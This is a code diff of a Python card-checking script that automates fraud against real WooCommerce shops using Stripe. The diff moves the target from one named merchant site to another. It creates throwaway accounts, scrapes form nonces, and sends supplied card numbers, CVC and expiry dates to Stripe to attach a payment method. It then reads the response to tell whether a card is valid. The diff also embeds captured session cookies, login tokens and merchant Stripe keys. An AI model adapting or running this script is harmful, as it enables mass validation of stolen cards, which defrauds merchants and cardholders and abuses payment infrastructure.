@@ -61,18 +61,12 @@ def Tele(ccx):
     nr = random.randint(100000, 999999)
     lr = random.randint(1000, 9999)
 
-    cookies = {
-        '_fbp': 'fb.1.1778504058068.608046779714101930',
-        'wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943': '12879c98b0',
-    }
-    
     headers = {
-        'authority': 'www.absolutelyspectacolar.com',
+        'authority': 'www.rubengalarreta.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        # 'cookie': '_fbp=fb.1.1778504058068.608046779714101930; wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943=12879c98b0',
-        'referer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/payment-methods/',
+        'referer': 'https://www.rubengalarreta.com/my-account-2/payment-methods/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -84,39 +78,34 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
-    response = session.get(
-        'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
-        #cookies=cookies,
-        headers=headers,
-    )
+    response = session.get('https://www.rubengalarreta.com/my-account-2/add-payment-method/', headers=headers)
     
     register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
     print(register)
     
     cookies = {
-        '_fbp': 'fb.1.1778504058068.608046779714101930',
-        'wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943': '12879c98b0',
-        '_ga_T1SM3MZJK5': 'GS2.1.s1778504066$o1$g0$t1778504066$j60$l0$h0',
-        '_ga': 'GA1.1.170578875.1778504067',
         'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
-        'sbjs_first_add': 'fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
+        'sbjs_current_add': 'fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F',
+        'sbjs_first_add': 'fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F',
         'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
         'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F',
-        'seopress-user-consent-accept': '1',
+        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F',
+        'wpml_browser_redirect_test': '0',
+        '_icl_visitor_lang_js': 'en_gb',
+        '__stripe_mid': '1363964f-db66-4f9e-a609-0106f81be3687f899e',
+        '__stripe_sid': '4a63f04c-ea31-48ff-a66c-c754f5279d31bcbea8',
     }
     
     headers = {
-        'authority': 'www.absolutelyspectacolar.com',
+        'authority': 'www.rubengalarreta.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
         'content-type': 'application/x-www-form-urlencoded',
-        # 'cookie': '_fbp=fb.1.1778504058068.608046779714101930; wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943=12879c98b0; _ga_T1SM3MZJK5=GS2.1.s1778504066$o1$g0$t1778504066$j60$l0$h0; _ga=GA1.1.170578875.1778504067; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-11%2012%3A54%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F; seopress-user-consent-accept=1',
-        'origin': 'https://www.absolutelyspectacolar.com',
-        'referer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
+        # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F; wpml_browser_redirect_test=0; _icl_visitor_lang_js=en_gb; __stripe_mid=1363964f-db66-4f9e-a609-0106f81be3687f899e; __stripe_sid=4a63f04c-ea31-48ff-a66c-c754f5279d31bcbea8',
+        'origin': 'https://www.rubengalarreta.com',
+        'referer': 'https://www.rubengalarreta.com/my-account-2/add-payment-method/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -129,11 +118,10 @@ def Tele(ccx):
     }
     
     data = {
-        'username': f'Rodamuser{nr}',
         'email': f'rodamuser{nr}@gmail.com',
         'password': 'Gloosmoke@123',
         'wc_order_attribution_source_type': 'typein',
-        'wc_order_attribution_referrer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/payment-methods/',
+        'wc_order_attribution_referrer': 'https://www.rubengalarreta.com/my-account-2/payment-methods/',
         'wc_order_attribution_utm_campaign': '(none)',
         'wc_order_attribution_utm_source': '(direct)',
         'wc_order_attribution_utm_medium': '(none)',
@@ -143,76 +131,25 @@ def Tele(ccx):
         'wc_order_attribution_utm_source_platform': '(none)',
         'wc_order_attribution_utm_creative_format': '(none)',
         'wc_order_attribution_utm_marketing_tactic': '(none)',
-        'wc_order_attribution_session_entry': 'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
-        'wc_order_attribution_session_start_time': '2026-05-11 12:54:27',
+        'wc_order_attribution_session_entry': 'https://www.rubengalarreta.com/my-account-2/add-payment-method/',
+        'wc_order_attribution_session_start_time': '2026-05-12 13:30:46',
         'wc_order_attribution_session_pages': '1',
         'wc_order_attribution_session_count': '1',
         'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
         'woocommerce-register-nonce': f'{register}',
-        '_wp_http_referer': '/customer-service/my-account/add-payment-method/',
+        '_wp_http_referer': '/my-account-2/add-payment-method/',
         'register': 'Register',
     }
     
     response = session.post(
-        'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
+        'https://www.rubengalarreta.com/my-account-2/add-payment-method/',
         #cookies=cookies,
         headers=headers,
         data=data,
     )
     
-    ajax = re.search(r'"nonce_wp_rest":"(.*?)"', response.text).group(1)
+    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
     print(ajax)
-    
-    cookies = {
-        '_ga': 'GA1.1.1730825564.1778504608',
-        'sbjs_migrations': '1418474375998%3D1',
-        'sbjs_current_add': 'fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
-        'sbjs_first_add': 'fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F',
-        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-        'seopress-user-consent-accept': '1',
-        '_fbp': 'fb.1.1778504611661.771746268727150521',
-        'wordpress_logged_in_129af3da7b5f92d444045647d47cc943': 'Rodamuser03%7C1779714253%7CHbTYYXrdj4yp5d5aEleuqchqyDX8coqymNghbViuHuR%7C2cb4de025797b7e969887b9963a2ba53b28062babbee7a64506218c1c960ecf4',
-        'wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943': 'ab14ec5c80',
-        '_ga_T1SM3MZJK5': 'GS2.1.s1778504607$o1$g1$t1778504655$j12$l0$h0',
-        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F',
-    }
-    
-    headers = {
-        'authority': 'www.absolutelyspectacolar.com',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        # 'cookie': '_ga=GA1.1.1730825564.1778504608; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-11%2013%3A03%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; seopress-user-consent-accept=1; _fbp=fb.1.1778504611661.771746268727150521; wordpress_logged_in_129af3da7b5f92d444045647d47cc943=Rodamuser03%7C1779714253%7CHbTYYXrdj4yp5d5aEleuqchqyDX8coqymNghbViuHuR%7C2cb4de025797b7e969887b9963a2ba53b28062babbee7a64506218c1c960ecf4; wpdiscuz_nonce_129af3da7b5f92d444045647d47cc943=ab14ec5c80; _ga_T1SM3MZJK5=GS2.1.s1778504607$o1$g1$t1778504655$j12$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.absolutelyspectacolar.com%2Fcustomer-service%2Fmy-account%2Fadd-payment-method%2F',
-        'origin': 'https://www.absolutelyspectacolar.com',
-        'referer': 'https://www.absolutelyspectacolar.com/customer-service/my-account/add-payment-method/',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
-    
-    data = {
-        'payment_method': 'stripe_cc',
-        '_wpnonce': f'{ajax}',
-    }
-    
-    response = session.post(
-        'https://www.absolutelyspectacolar.com/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent',
-        #cookies=cookies,
-        headers=headers,
-        data=data,
-    )
-    
-    seti = re.search(r'"id":"(.*?)"', response.text).group(1)
-    scrt = re.search(r'"client_secret":"(.*?)"', response.text).group(1)
-    print(seti)
-    print(scrt)
     
     headers = {
         'authority': 'api.stripe.com',
@@ -230,18 +167,63 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
     }
     
-    data = f'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]=10002&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=3061c4fa-b194-4250-9fd1-9445b4e28e75d3693c&payment_method_data[muid]=d8e489e8-875d-4013-93f6-34f59f51ac0b008cbd&payment_method_data[sid]=6524cf56-06f3-4bce-ac6f-8ad7fba7e4d735937f&payment_method_data[payment_user_agent]=stripe.js%2Fc891fde8fc%3B+stripe-js-v3%2Fc891fde8fc%3B+split-card-element&payment_method_data[referrer]=https%3A%2F%2Fwww.absolutelyspectacolar.com&payment_method_data[time_on_page]=113450&payment_method_data[client_attribution_metadata][client_session_id]=5d900189-f0d2-413f-986a-1fd2902202d7&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=split-card-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2017&payment_method_data[client_attribution_metadata][wallet_config_id]=ec46131c-af09-450b-8337-ded7960d0d63&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51L2p6RLp1x9wo94murnx4U0OySL92vosBDnOlzEjQJtd5zbxSlikGl9uEMTNddUfA82tfiURd5rwPXuDC16zwsEQ00Hxmthid3&_stripe_account=acct_1L2p6RLp1x9wo94m&_stripe_version=2022-08-01&client_attribution_metadata[client_session_id]=5d900189-f0d2-413f-986a-1fd2902202d7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&client_attribution_metadata[wallet_config_id]=ec46131c-af09-450b-8337-ded7960d0d63&client_secret={scrt}'
+    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&payment_user_agent=stripe.js%2F348e70f6a4%3B+stripe-js-v3%2F348e70f6a4%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.rubengalarreta.com&time_on_page=79149&client_attribution_metadata[client_session_id]=c56df26b-da01-4770-bb6f-39a0dc56914b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1jRr53ToAS6&client_attribution_metadata[elements_session_config_id]=8c907165-c51a-4c6f-99c8-8544171a8f73&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=3061c4fa-b194-4250-9fd1-9445b4e28e75d3693c&muid=1363964f-db66-4f9e-a609-0106f81be3687f899e&sid=4a63f04c-ea31-48ff-a66c-c754f5279d31bcbea8&key=pk_live_W09R2BNFOKZdALsCPrPHK9kt00BSDiOjVx&_stripe_version=2025-09-30.clover'
     
-    response = requests.post(
-        f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
-        headers=headers,
-        data=data,
-    )
+    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+    
+    pm = response.json()['id']
+    print(pm)
+    
+    cookies = {
+        'wordpress_sec_fd507000934a5d1d404495322d663265': 'rodamuser02%7C1779802288%7C9GvLTWjDEDpg0dWEzYcEQfUccorY0PpUtNnsk2CgEzg%7C983bf4e748bedc35523fac1ddd6b4afdb7000a24449c02eaf5013ec63d96394b',
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F',
+        'sbjs_first_add': 'fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F',
+        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+        '_icl_visitor_lang_js': 'en_gb',
+        '__stripe_mid': '1363964f-db66-4f9e-a609-0106f81be3687f899e',
+        '__stripe_sid': '4a63f04c-ea31-48ff-a66c-c754f5279d31bcbea8',
+        'hu-form': 'true',
+        'wordpress_logged_in_fd507000934a5d1d404495322d663265': 'rodamuser02%7C1779802288%7C9GvLTWjDEDpg0dWEzYcEQfUccorY0PpUtNnsk2CgEzg%7C8e244473a661c2c9821d32e6a51ee72f4e41a565e7611eb65618ac66d4722424',
+        'wp-wpml_current_language': 'en',
+        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F',
+        'wpml_browser_redirect_test': '0',
+    }
+    
+    headers = {
+        'authority': 'www.rubengalarreta.com',
+        'accept': '*/*',
+        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'wordpress_sec_fd507000934a5d1d404495322d663265=rodamuser02%7C1779802288%7C9GvLTWjDEDpg0dWEzYcEQfUccorY0PpUtNnsk2CgEzg%7C983bf4e748bedc35523fac1ddd6b4afdb7000a24449c02eaf5013ec63d96394b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-12%2013%3A30%3A46%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; _icl_visitor_lang_js=en_gb; __stripe_mid=1363964f-db66-4f9e-a609-0106f81be3687f899e; __stripe_sid=4a63f04c-ea31-48ff-a66c-c754f5279d31bcbea8; hu-form=true; wordpress_logged_in_fd507000934a5d1d404495322d663265=rodamuser02%7C1779802288%7C9GvLTWjDEDpg0dWEzYcEQfUccorY0PpUtNnsk2CgEzg%7C8e244473a661c2c9821d32e6a51ee72f4e41a565e7611eb65618ac66d4722424; wp-wpml_current_language=en; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.rubengalarreta.com%2Fmy-account-2%2Fadd-payment-method%2F; wpml_browser_redirect_test=0',
+        'origin': 'https://www.rubengalarreta.com',
+        'referer': 'https://www.rubengalarreta.com/my-account-2/add-payment-method/',
+        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+        'sec-ch-ua-mobile': '?1',
+        'sec-ch-ua-platform': '"Android"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+    
+    data = {
+        'action': 'wc_stripe_create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': f'{pm}',
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': f'{ajax}',
+    }
+    
+    response = session.post('https://www.rubengalarreta.com/wp-admin/admin-ajax.php', #cookies=cookies, 
+    headers=headers, data=data)
     
     try:
-        result = re.search(r'"message": "(.*?)"', response.text).group(1)
+        result = re.search(r'"message":"(.*?)"', response.text).group(1)
     except:
-        result = re.search(r'"status": "(.*?)"', response.text).group(1)
